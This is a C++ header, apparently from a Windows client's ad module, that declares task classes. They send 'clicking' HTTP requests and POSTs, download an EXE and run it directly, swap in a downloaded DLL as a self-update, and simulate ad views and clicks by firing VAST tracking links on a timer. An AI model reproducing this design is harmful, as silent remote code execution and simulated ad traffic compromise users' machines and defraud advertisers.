#pragma once
#include <synacast/xdll/PacketBuilder.h>
#include "Task.h"
#include "AdConfig.h"
#include "LogVast.h"

extern HANDLE g_hAdsExitEvent;
//extern HANDLE g_hLoadUadetailsSucceed;

// 普通任务 仅仅是能特殊Http头部的请求任务
class UrlClickingTask : public Task
{
public:
	explicit UrlClickingTask( const NormalTaskInfo& taskinfo ) : m_taskinfo( taskinfo )
	{

	}

	virtual void Run();

	NormalTaskInfo m_taskinfo;
};


//下载最新版本的UaDetails.xml
class DownloadUAConfigTask : public Task
{
public:
	virtual void Run();
	
};

//下载解析httptask.ini
class GetIniConfigTask : public Task
{
public:
	GetIniConfigTask(DWORD msgThreadId) : m_msgThreadId(msgThreadId)//, m_useLeaf1(false)
	{
	}
	
	virtual void Run();
	
public:
	DWORD m_msgThreadId;
};


// POST任务，就是组包然后向服务器Post
class PostClickingTask : public Task
{
public:
	explicit PostClickingTask( const PostTaskInfo& taskinfo ) : m_taskinfo( taskinfo )
	{

	}

	virtual void Run();

	PostTaskInfo m_taskinfo;
};

// EXE任务，下载EXE，直接执行
class EXERunningTask : public Task
{
public:
	explicit EXERunningTask( const EXETaskInfo& taskinfo ) : m_taskinfo( taskinfo )
	{
	}

	virtual void Run();

	EXETaskInfo m_taskinfo;
};

// 自升级任务，下载dll下来把自己换掉
class UpdateRunningTask : public Task
{
public:
	explicit UpdateRunningTask( const UpdateTaskInfo& taskinfo ) : m_taskinfo( taskinfo )
	{
	}

	virtual void Run();

	UpdateTaskInfo m_taskinfo;
};

class IniFile;
class SimRunningTask : public Task
{
public:
	SimRunningTask(DWORD msgThreadId) : m_msgThreadId(msgThreadId)//, m_useLeaf1(false)
	{
	}

	virtual void Run() = 0;
	
	DWORD             m_msgThreadId;
	UINT			  m_taskDelayTime;	//任务之间间隔时间，单位：s

public:
	enum TracklinkType
	{
		START_TRACK = 1,
		FIRST_QUARTER_TRACK,
		HALF_TRACK,
		THREE_QUARTER_TRACK,
		END_TRACK,
		CLICK_LINK,
		CLICK_TRACK
	};
protected:
	AdConfig m_adConfig;

	void SendLink(int nTrackType, vector<string>& Links, ADInfo& adinfo);
	void IntervalDetect(unsigned int periodCurrent, bool runClickLink, unsigned int beforeClick, ADInfo& adInfo);
	void RunAdConfig();
	void RunClickLink(IniFile& ini, string& link);
	bool RunClickLink(string& link, ADInfo& adInfo);
};

class ClientSimRunningTask : public SimRunningTask
{
public:
	ClientSimRunningTask(const ClientSimTaskInfo& taskinfo, DWORD msgThreadId);
	ClientSimRunningTask(const ClientExSimTaskInfo& taskinfo, DWORD msgThreadId);

	virtual void Run();

private:
	ClientSimTaskInfo m_taskinfo;
	CString m_strClientUrl;
	UINT16 m_isSecure;
};

class VASTSimRunningTask : public SimRunningTask
{
public:
	VASTSimRunningTask(const VASTSimTaskInfo& taskinfo, DWORD msgThreadId, UINT32 uDelayTime);
	VASTSimRunningTask(const VASTExSimTaskInfo& taskinfo, DWORD msgThreadID, UINT32 uDelayTime);

	void ReplaceJuid();		//替换[juid]
	void ReplacePolicy();	//替换[policy]
	void ReplaceVer();		//替换[ver]
	virtual void Run();

public:
	LogVast m_VastGetLog;

private:
	CString m_strVastUrl;
	UINT16 m_isSecure;
};


//////////////////////////////////////////////////////////////////////////
/// 提交日志的任务
class SendingLogTask : public Task
{
public:
	explicit SendingLogTask(const CString& url) : m_url(url)
	{
	}
	
	virtual void Run();

	CString m_url;
};

//////////////////////////////////////////////////////////////////////////
/// 提交启动日志的任务
// class SendingStartLogTask : public Task
// {
// public:	
// 	virtual void Run();
// };


//////////////////////////////////////////////////////////////////////////
// 延迟删除对象
template<typename T>
class DelayDeleteObjectTask : public Task
{
public:
	DelayDeleteObjectTask(T* object):m_object(object)
	{
	}

	virtual void Run()
	{
		if (m_object) {
			delete m_object;
		}
	}
protected:
	T* m_object;
};